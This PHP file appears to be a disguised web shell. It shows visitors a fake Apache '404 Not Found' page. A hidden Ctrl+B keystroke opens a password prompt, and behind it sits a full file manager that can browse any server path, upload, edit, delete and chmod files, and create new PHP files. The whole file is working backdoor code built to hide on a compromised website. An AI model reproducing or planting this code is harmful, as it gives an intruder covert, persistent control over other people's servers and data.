<?php
session_start();

$_ph           = '$2b$12$N4raOEL6/ZzPEDAofh2M3.XxFgtpzGFfFwac4QCIg7s8WR/44SbTi';
$_max_attempts = 5;
$_lockout_time = 300;

if(!isset($_SESSION['_fa'])) $_SESSION['_fa'] = 0;
if(!isset($_SESSION['_ft'])) $_SESSION['_ft'] = 0;

$_locked    = ($_SESSION['_fa'] >= $_max_attempts && (time() - $_SESSION['_ft']) < $_lockout_time);
$_remaining = $_lockout_time - (time() - $_SESSION['_ft']);

function _chk($p, $h){ return password_verify($p, $h); }

// AJAX auth
if(
    isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&
    $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest' &&
    isset($_POST['q'])
){
    header('Content-Type: application/json');
    if($_locked){
        echo json_encode(['ok'=>false,'locked'=>true,'wait'=>(int)$_remaining]);
        exit;
    }
    if(_chk($_POST['q'], $_ph)){
        $_SESSION['_sid'] = true;
        $_SESSION['_fa']  = 0;
        session_regenerate_id(true);
        echo json_encode(['ok'=>true]);
    } else {
        $_SESSION['_fa']++;
        $_SESSION['_ft'] = time();
        $left = max(0, $_max_attempts - $_SESSION['_fa']);
        echo json_encode(['ok'=>false,'left'=>$left]);
    }
    exit;
}

// Logout
if(isset($_GET['_x'])){
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

$authed = isset($_SESSION['_sid']) && $_SESSION['_sid'] === true;

if(!$authed): ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Times New Roman',serif;background:#fff;color:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;}
        h1{font-size:36px;font-weight:bold;border-bottom:1px solid #000;padding-bottom:10px;margin-bottom:10px;}
        p{font-size:14px;}
        hr{width:400px;border:none;border-top:1px solid #000;margin:10px 0;}
    </style>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <p><small>Apache/2.4.41 (Ubuntu) Server</small></p>
    <script>
    (function(){
        var _k=[], _t=[17,66];
        document.addEventListener('keydown',function(e){
            _k.push(e.keyCode);
            if(_k.length>2) _k.shift();
            if(e.keyCode===27) _close();
            if(_k[0]===_t[0]&&_k[1]===_t[1]){ e.preventDefault(); _open(); }
        });
        function _open(){
            if(document.getElementById('_ov')) return;
            var ov=document.createElement('div');
            ov.id='_ov';
            ov.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:9999;';
            var bx=document.createElement('div');
            bx.style.cssText='background:#1e1e1e;border:1px solid #444;border-radius:6px;padding:30px 40px;display:flex;flex-direction:column;gap:12px;min-width:300px;';
            var lb=document.createElement('div');
            lb.style.cssText='color:#888;font-size:12px;font-family:monospace;';
            lb.textContent='//';
            var inp=document.createElement('input');
            inp.type='password'; inp.id='_pi'; inp.autocomplete='off';
            inp.style.cssText='background:#111;border:1px solid #555;color:#fff;padding:8px 12px;border-radius:4px;font-size:14px;font-family:monospace;outline:none;width:100%;';
            var er=document.createElement('div');
            er.id='_er';
            er.style.cssText='color:#f44336;font-size:12px;font-family:monospace;display:none;';
            er.textContent='Incorrect.';
            var btn=document.createElement('button');
            btn.textContent='Enter';
            btn.style.cssText='background:#007acc;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-size:14px;';
            btn.onclick=_submit;
            inp.addEventListener('keydown',function(e){ if(e.key==='Enter') _submit(); });
            inp.addEventListener('focus',function(){ inp.style.borderColor='#007acc'; });
            inp.addEventListener('blur',function(){ inp.style.borderColor='#555'; });
            bx.appendChild(lb); bx.appendChild(inp); bx.appendChild(er); bx.appendChild(btn);
            ov.appendChild(bx); document.body.appendChild(ov);
            setTimeout(function(){ inp.focus(); },50);
        }
        function _close(){
            var ov=document.getElementById('_ov');
            if(ov) ov.remove();
        }
        function _submit(){
            var val=document.getElementById('_pi').value;
            if(!val) return;
            var fd=new FormData();
            fd.append('q',val);
            fetch('',{method:'POST',headers:{'X-Requested-With':'XMLHttpRequest'},body:fd})
            .then(function(r){ return r.json(); })
            .then(function(d){
                if(d.ok){ window.location.reload(); }
                else {
                    var er=document.getElementById('_er');
                    var pi=document.getElementById('_pi');
                    if(er){
                        if(d.locked){ var m=Math.ceil(d.wait/60); er.textContent='Too many attempts. Wait '+m+' min.'; }
                        else if(typeof d.left!=='undefined'&&d.left<=2){ er.textContent='Incorrect. '+d.left+' attempt(s) left.'; }
                        else { er.textContent='Incorrect.'; }
                        er.style.display='block';
                    }
                    if(pi){ pi.value=''; pi.focus(); }
                }
            });
        }
    })();
    </script>
</body>
</html>
<?php
exit;
endif;

// --- FILE MANAGER ---

function _perms($p){ return substr(sprintf('%o', fileperms($p)), -4); }

// Resolve current path
if(isset($_GET['path']) && $_GET['path'] !== '' && is_dir($_GET['path'])){
    $path = $_GET['path'];
} else {
    $path = __DIR__;
}

// Upload
if(isset($_FILES['file']) && $_FILES['file']['error'] === 0){
    $dest = $path . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $dest)){
        echo "<script>alert('Uploaded!');window.location.href='?path=".urlencode($path)."';</script>";
    } else {
        echo "<script>alert('Upload failed!');</script>";
    }
}

// Delete
if(isset($_GET['delete'])){
    $del = $path . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    if(is_file($del)){
        unlink($del);
        echo "<script>alert('Deleted!');window.location.href='?path=".urlencode($path)."';</script>";
    } elseif(is_dir($del)){
        if(@rmdir($del)){
            echo "<script>alert('Directory deleted!');window.location.href='?path=".urlencode($path)."';</script>";
        } else {
            echo "<script>alert('Not empty or permission denied!');</script>";
        }
    }
}

// Save
if(isset($_POST['save'], $_POST['content'], $_POST['edit_file'])){
    $ef = $path . DIRECTORY_SEPARATOR . basename($_POST['edit_file']);
    if(is_file($ef)){
        file_put_contents($ef, $_POST['content']);
        echo "<script>alert('Saved!');window.location.href='?path=".urlencode($path)."';</script>";
    }
}

// Chmod
if(isset($_POST['change_perms'], $_POST['perms'], $_POST['target_item'])){
    $cp   = $path . DIRECTORY_SEPARATOR . basename($_POST['target_item']);
    $mode = octdec($_POST['perms']);
    if(file_exists($cp)){
        chmod($cp, $mode);
        if(isset($_POST['recursive']) && is_dir($cp)){
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($cp, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach($it as $item) chmod($item->getPathname(), $mode);
        }
        echo "<script>alert('Permissions updated!');window.location.href='?path=".urlencode($path)."';</script>";
    }
}

// Create PHP
if(isset($_POST['create'], $_POST['filename'])){
    $fn  = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['filename']);
    $nfp = $path . DIRECTORY_SEPARATOR . $fn . '.php';
    if(!file_exists($nfp)){
        file_put_contents($nfp, "<?php\n\n?>");
        echo "<script>alert('Created!');window.location.href='?path=".urlencode($path)."';</script>";
    }
}

// Directory listing
$items = scandir($path);
$dirs  = []; $files = [];
foreach($items as $f){
    if($f==='.'||$f==='..') continue;
    $fp = $path . DIRECTORY_SEPARATOR . $f;
    if(is_dir($fp)) $dirs[] = $f; else $files[] = $f;
}
$sorted = array_merge($dirs, $files);

// Breadcrumb
$path_normalized = rtrim(str_replace('\\','/',$path),'/');
$parts = array_filter(explode('/', $path_normalized));
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Index of /<?php echo htmlspecialchars(basename($path)); ?></title>
    <style>
        :root{--bg:#121212;--panel:#1e1e1e;--text:#d4d4d4;--accent:#007acc;--border:#333;--hover:#2a2d2e;--input:#252526;--danger:#f44336;--folder:#e8b363;}
        *{box-sizing:border-box;}
        body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);margin:0;padding:20px;}
        a{color:var(--accent);text-decoration:none;}
        .wrap{max-width:1100px;margin:0 auto;background:var(--panel);border:1px solid var(--border);border-radius:4px;overflow:hidden;}
        .hdr{padding:15px 20px;background:#252526;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--border);}
        .pbar{padding:10px 20px;background:#2d2d2d;font-family:monospace;font-size:13px;word-break:break-all;}
        .pbar a{color:#ccc;}
        .toolbar{padding:15px 20px;display:flex;gap:20px;border-bottom:1px solid var(--border);flex-wrap:wrap;}
        table{width:100%;border-collapse:collapse;}
        th{text-align:left;padding:12px 20px;background:#252526;color:#888;font-size:12px;text-transform:uppercase;}
        td{padding:10px 20px;border-bottom:1px solid var(--border);}
        tr:hover{background:var(--hover);}
        input[type=text],textarea{background:var(--input);border:1px solid var(--border);color:#fff;padding:5px 10px;border-radius:3px;}
        input[type=submit],button{background:var(--accent);color:#fff;border:none;padding:6px 12px;border-radius:3px;cursor:pointer;}
        .modal{padding:20px;background:#1a1a1a;border-top:2px solid var(--accent);}
        .editor{width:100%;height:400px;margin-top:10px;font-family:'Consolas',monospace;}
        .del{color:var(--danger);}
        .lbtn{background:#333;color:#ccc;border:1px solid #555;padding:4px 10px;border-radius:3px;font-size:12px;text-decoration:none;}
    </style>
</head>
<body>
<div class="wrap">
    <div class="hdr">
        <h2 style="margin:0;">File Manager</h2>
        <a href="?_x=1" class="lbtn">Logout</a>
    </div>

    <div class="pbar">
        <?php
        $acc = '';
        foreach($parts as $part){
            $acc .= '/' . $part;
            echo '<a href="?path='.urlencode($acc).'">'.htmlspecialchars($part).'</a> / ';
        }
        ?>
    </div>

    <div class="toolbar">
        <form method="post" enctype="multipart/form-data" action="?path=<?php echo urlencode($path); ?>">
            <input type="file" name="file" required>
            <input type="submit" value="Upload">
        </form>
        <form method="post" action="?path=<?php echo urlencode($path); ?>">
            <input type="text" name="filename" placeholder="filename" required>
            <input type="submit" name="create" value="Create PHP">
        </form>
    </div>

    <table>
        <thead><tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr></thead>
        <tbody>
        <?php foreach($sorted as $f):
            $fp = $path . DIRECTORY_SEPARATOR . $f;
            $id = is_dir($fp);
        ?>
            <tr>
                <td>
                    <?php if($id): ?>
                        <a href="?path=<?php echo urlencode($fp); ?>" style="color:var(--folder)">📁 <?php echo htmlspecialchars($f); ?></a>
                    <?php else: ?>
                        📄 <?php echo htmlspecialchars($f); ?>
                    <?php endif; ?>
                </td>
                <td><?php echo $id ? '-' : number_format(filesize($fp)).' B'; ?></td>
                <td><code><?php echo _perms($fp); ?></code></td>
                <td>
                    <?php if(!$id): ?>
                        <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>">Edit</a> |
                    <?php endif; ?>
                    <a href="?path=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($f); ?>">Chmod</a> |
                    <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" class="del" onclick="return confirm('Delete?')">Delete</a>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>

    <?php if(isset($_GET['chmod'])):
        $ci = basename($_GET['chmod']);
        $cp = $path . DIRECTORY_SEPARATOR . $ci;
        if(file_exists($cp)):
    ?>
    <div class="modal">
        <h3>Permissions: <?php echo htmlspecialchars($ci); ?></h3>
        <form method="post" action="?path=<?php echo urlencode($path); ?>">
            <input type="text" name="perms" value="<?php echo _perms($cp); ?>">
            <?php if(is_dir($cp)): ?>
                <label><input type="checkbox" name="recursive"> Recursive</label>
            <?php endif; ?>
            <input type="hidden" name="target_item" value="<?php echo htmlspecialchars($ci); ?>">
            <input type="submit" name="change_perms" value="Apply">
            <a href="?path=<?php echo urlencode($path); ?>">Cancel</a>
        </form>
    </div>
    <?php endif; endif; ?>

    <?php if(isset($_GET['edit'])):
        $ei = basename($_GET['edit']);
        $ep = $path . DIRECTORY_SEPARATOR . $ei;
        if(is_file($ep)):
    ?>
    <div class="modal">
        <h3>Editing: <?php echo htmlspecialchars($ei); ?></h3>
        <form method="post" action="?path=<?php echo urlencode($path); ?>">
            <textarea name="content" class="editor"><?php echo htmlspecialchars(file_get_contents($ep)); ?></textarea>
            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($ei); ?>">
            <br><br>
            <input type="submit" name="save" value="Save File">
            <a href="?path=<?php echo urlencode($path); ?>">Cancel</a>
        </form>
    </div>
    <?php endif; endif; ?>
</div>
</body>
</html>
